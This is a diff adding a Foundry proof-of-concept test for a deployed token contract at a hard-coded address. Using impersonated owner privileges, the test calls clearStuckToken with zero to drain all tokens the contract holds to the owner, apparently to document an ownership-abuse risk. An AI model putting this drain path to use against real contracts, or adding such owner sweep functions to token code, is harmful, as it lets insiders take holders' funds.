@@ -1,0 +1,63 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.15;
+
+import "forge-std/Test.sol";
+
+interface ILUNAINU {
+    function getOwner() external view returns (address);
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+contract ExploitTest is Test {
+    address constant LUNAINU = 0xf05a8a840f09ac83b79875b4275cec1e60c2abdf;
+    ILUNAINU public token;
+
+    address public owner;
+    uint256 public constant DEPOSIT_AMOUNT = 1000e9; // 1000 tokens (9 decimals)
+
+    function setUp() public {
+        token = ILUNAINU(LUNAINU);
+        vm.label(LUNAINU, "LUNAINU");
+
+        // Retrieve the contract owner
+        owner = token.getOwner();
+        vm.label(owner, "Owner");
+
+        // Ensure the contract has some tokens to drain
+        // The owner holds the entire initial supply, transfer a portion to the contract
+        vm.startPrank(owner);
+        token.transfer(address(token), DEPOSIT_AMOUNT);
+        vm.stopPrank();
+
+        // Verify deposit succeeded
+        require(token.balanceOf(address(token)) >= DEPOSIT_AMOUNT, "Deposit failed");
+    }
+
+    function testOwnershipAbuseDrainTokens() public {
+        uint256 contractBalanceBefore = token.balanceOf(address(token));
+        uint256 ownerBalanceBefore = token.balanceOf(owner);
+
+        // Owner calls clearStuckToken with 0 to drain all tokens held by the contract
+        vm.prank(owner);
+        bool success = token.clearStuckToken(LUNAINU, 0);
+        assertTrue(success, "clearStuckToken failed");
+
+        uint256 contractBalanceAfter = token.balanceOf(address(token));
+        uint256 ownerBalanceAfter = token.balanceOf(owner);
+
+        // The contract should have lost all its token balance
+        assertEq(contractBalanceAfter, 0, "Contract still holds tokens after drain");
+
+        // The owner should have gained exactly the amount that was in the contract
+        assertEq(
+            ownerBalanceAfter - ownerBalanceBefore,
+            contractBalanceBefore,
+            "Owner did not receive all drained tokens"
+        );
+    }
+}
+```
